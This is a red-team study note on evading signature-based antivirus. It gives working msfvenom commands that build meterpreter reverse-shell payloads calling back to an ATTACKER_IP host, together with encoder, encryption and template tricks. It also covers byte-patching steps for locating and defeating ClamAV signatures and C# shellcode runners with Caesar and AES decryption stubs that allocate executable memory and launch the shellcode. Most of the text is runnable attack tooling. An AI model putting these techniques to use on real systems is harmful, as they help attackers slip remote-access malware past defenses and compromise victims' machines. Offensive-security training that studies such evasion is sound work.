---
title: Signature Based Detection
draft: false
tags:
  - red-teaming
  - windows
  - av-evasion
  - evasion
  - signature-detection
---
 
Turn off heuristic + real time detection from the AV to test our payloads.

# Modifying Payload Manually (not recommended)

## File hash detection signature

Early signature-based detection methods compared file hashes, which meant that detection could be evaded by changing a single byte in the scanned file.

If the complete file is detected, we can modify the last byte of the payload to 0x00 or 0xFF:
```powershell
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[73801] = 0xFF # last byte
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```

## Byte string hash detection signature

The signatures are based on byte strings inside the binary. If we are being detected and we dont know why, to bypass this, we can split the binary into multiple pieces and perform an on-demand scan of sequentially smaller pieces until the exact bytes are found.

We can use the [_Find-AVSignature_](http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html) PowerShell script.

Create a payload with msfvenom:
```
msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/meterpreter/reverse_tcp -f exe -o payload.exe
```

Open a powershell and load the ps1 script:
```powershell
C:\> powershell.exe -Exec bypass
PS C:\> Import-Module .\Find-AVSignature.ps1
```

Run the tool to split the payload into segments. It will create one file per segment of our payload (0, 0-10000, 0-20000, etc)
```powershell
PS C:\> Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force

Parameters:
-StartByte: starting byte to scan
-EndByte: ending byte to end
-Interval: size of each individual segment of the file we will split
-Path: input file (payload)
-OutPath: output folder
-Verbose
-Force: force the creation of the destination directory
```

Run the AV scan over our segements:
```powershell
PS C:\> cd 'C:\Program Files\ClamAV\'
PS C:\> .\clamscan.exe C:\Tools\avtest1
C:\Tools\avtest1\met_0.bin: OK
C:\Tools\avtest1\met_10000.bin: OK
C:\Tools\avtest1\met_20000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_30000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_40000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_50000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_60000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_70000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest1\met_73801.bin: Win.Trojan.MSShellcode-7 FOUND
```

We can start fine tunning the scan. If the signature detection is between Bytes 10000-20000, we can now split into segments of 1000 bytes that range of bytes no narrow down the search:
```powershell
PS C:\> Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force
```

Scan again the segments:
```
.\clamscan.exe C:\Tools\avtest2
C:\Tools\avtest3\met_18000.bin: OK
C:\Tools\avtest3\met_18100.bin: OK
C:\Tools\avtest3\met_18200.bin: OK
C:\Tools\avtest3\met_18300.bin: OK
C:\Tools\avtest3\met_18400.bin: OK
C:\Tools\avtest3\met_18500.bin: OK
C:\Tools\avtest3\met_18600.bin: OK
C:\Tools\avtest3\met_18700.bin: OK
C:\Tools\avtest3\met_18800.bin: OK
C:\Tools\avtest3\met_18900.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest3\met_19000.bin: Win.Trojan.MSShellcode-7 FOUND
```

> [!Note]
> We can see 2 different signatures detected.

Repeat the process until we find the first byte of the signature detected:
```powershell
PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest5
C:\Tools\avtest5\met_18860.bin: OK
C:\Tools\avtest5\met_18861.bin: OK
C:\Tools\avtest5\met_18862.bin: OK
C:\Tools\avtest5\met_18863.bin: OK
C:\Tools\avtest5\met_18864.bin: OK
C:\Tools\avtest5\met_18865.bin: OK
C:\Tools\avtest5\met_18866.bin: OK
C:\Tools\avtest5\met_18867.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest5\met_18868.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest5\met_18869.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest5\met_18870.bin: Win.Trojan.Swrort-5710536-0 FOUND
```

Lets change the first byte of the signature detected to 0 and save it to a new file:
```powershell
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[18867] = 0
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```

Repeat the scan. We will see it now bypasses the signature detection. If we modify the exact byte and dont work, try with the next one or the previous one.

> [!Note]
> With the next detected signatures (if there is more than one signature detected), we will have to repeat the process over the new executable created.

If we try to execute the payload it wont work because we changed the functionality of the payload.

---
# Bypassing Antivirus with Metasploit

## Encoders

List metasploit encoders:
```bash
$ msfvenom --list encoders
```

**x86 Encoders**

The [_x86/shikata_ga_nai_](https://danielsauder.com/2015/08/26/an-analysis-of-shikata-ga-nai/) encoder is a commonly-used polymorphic encoder that produces different output each time it is run, making it effective for signature evasion.

- Generate the encoded 32b payload:
```bash
$ sudo msfvenom -p windows/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe
```

If we scan the payload it will be detected. The reason is that the shellcode is encoded and must be decoded to be able to run. The routine that decodes the shellcode (decoder) is not encoded and static, meaning its perfect for signature detection:
```powershell
PS C:\> .\clamscan.exe C:\Tools\met.exe
C:\Tools\met.exe: Win.Trojan.Swrort-5710536-0 FOUND
```

**64 Encoders**

As an alternative, 64bit payloads are less common and might bypass AV detection. 

- If we generate a normal payload, it bypasses the ClamAV detection but not Aviras:
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o /var/www/html/met64.exe
```

- We can encode this payload utilizing [_x64/zutto_dekiru_](https://www.infosecmatter.com/metasploit-module-library/?mm=encoder/x64/zutto_dekiru), which borrows techniques from shikata_ga_nai:
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -e x64/zutto_dekiru -f exe -o /var/www/html/met64_zutto.exe
```

> [!Note]
> We cannot use `shikata_ga_nai` encoder since its a 32b payload.

This payload will also be detected. When msfvenom generates an executable, it inserts the shellcode into a valid executable. This template executable is static and likely has signatures attached to it as well.

To use a different executable template:
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o /var/www/html/met64_notepad.exe
```

## Encryptors

List encryption options:
```bash
$ msfvenom --list encrypt
```

Generate an encrypted payload using aes256:
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe

Parameters:
--encrypt: encryption algorythm
--encrypt-key: custom encryption key
```

> [!Note]
> This method is still detected by AV because the decryption routines itself are static, so signatures are written for them.

---
# Bypassing Antivirus with C\#

If we compile the traditional C# shellcode runner as a 64b application from [[Phishing with Jscript]] module, we can see is partially detected by AV engines (signature + heuristic):

> [!Note]
> We are using an unencoded and unencrypted shellcode.

The key of bypassing AV detection is with custom code, so we have to create a custom decryption routine to avoid detection.

We are going to use the Caesar Cipher (shift the characters and numbers by key positions)

1. Create a new C# Console App project in Visual Studio called "Helper".
2. Implement the encryption routine that outputs the shellcode encrypted with Caesar Cipher in metasploit format:
```csharp
namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
	        // msfvenom payload
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4,0xf0...
            
			// encode the payload using caesar cipher    
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            // format the payload in metasploit format
			foreach(byte b in encoded)
			{
			    hex.AppendFormat("0x{0:x2}, ", b); // each substring starts with 0x followed by the formatted byte value in hexadecemial:
			    // 0: fist arg that has to be formatted
			    // x: hexadecimal format
			    // 2: number of digits
			    // Example: 0x1F
			}
			
			Console.WriteLine("The payload is: " + hex.ToString());
		}
	}
}
```

3. Compile the Project and execute it to output the encrypted shellcode.
4. Replace the Shellcode with the new encrypted shellcode.
5. Add the decryption routine to the C# code:
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
              0xfc,0x48,0x83,0xe4...
			
			for(int i = 0; i < buf.Length; i++)
			{
			    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
			}
			
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

TODO: Use the [_Exclusive or_](https://en.wikipedia.org/wiki/XOR_cipher) (XOR) operation to create a different encryption routine and bypass antivirus. Optional: How effective is this solution?

**AES-256 Custom Encryption Routine**

The most robust approach is AES-256-CBC encryption with a random IV embedded in the payload header. The key is derived at runtime (e.g., from an environment variable or a remote beacon), so the decryptor stub itself contains no fixed key and signatures cannot be written for it.

```csharp
// Encrypt (run once offline in a separate C# Helper project):
using System.Security.Cryptography;

byte[] key = new byte[32]; // 256-bit key — store securely, derive at runtime
byte[] iv  = new byte[16]; // random IV per build
using (var rng = RandomNumberGenerator.Create())
{
    rng.GetBytes(key);
    rng.GetBytes(iv);
}

byte[] encrypted;
using (var aes = Aes.Create())
{
    aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC;
    using var enc = aes.CreateEncryptor();
    encrypted = enc.TransformFinalBlock(buf, 0, buf.Length);
}
// Prepend IV: byte[] blob = iv + encrypted
```

Decrypt in the runner:
```csharp
byte[] key = /* derived at runtime */;
byte[] blob = new byte[] { /* iv + ciphertext */ };
byte[] iv  = blob[0..16];
byte[] ct  = blob[16..];
byte[] buf;
using (var aes = Aes.Create())
{
    aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC;
    using var dec = aes.CreateDecryptor();
    buf = dec.TransformFinalBlock(ct, 0, ct.Length);
}
// buf is now the raw shellcode — allocate and execute
```

> [!Warning]
> Even AES-256 will be caught if the shellcode is written to memory with `PAGE_EXECUTE_READWRITE` and then executed inline. Chain with:
> 1. [[Behavior-Heuristic Based Detection]] — sleep timer + VirtualAllocExNuma check
> 2. Runtime key derivation (environment variable, LDAP lookup, domain name hash)
> 3. `VirtualProtect` RW→RX transition after decryption (avoids RWX allocation)



---
# Related Notes

- [[Antivirus Evasion]] — overview and mental model
- [[Behavior-Heuristic Based Detection]] — runtime/sandbox evasion
- [[Bypassing AV in Office]] — signature evasion in VBA macros
- [[Process Injection and Migration]] — custom shellcode runners in C#
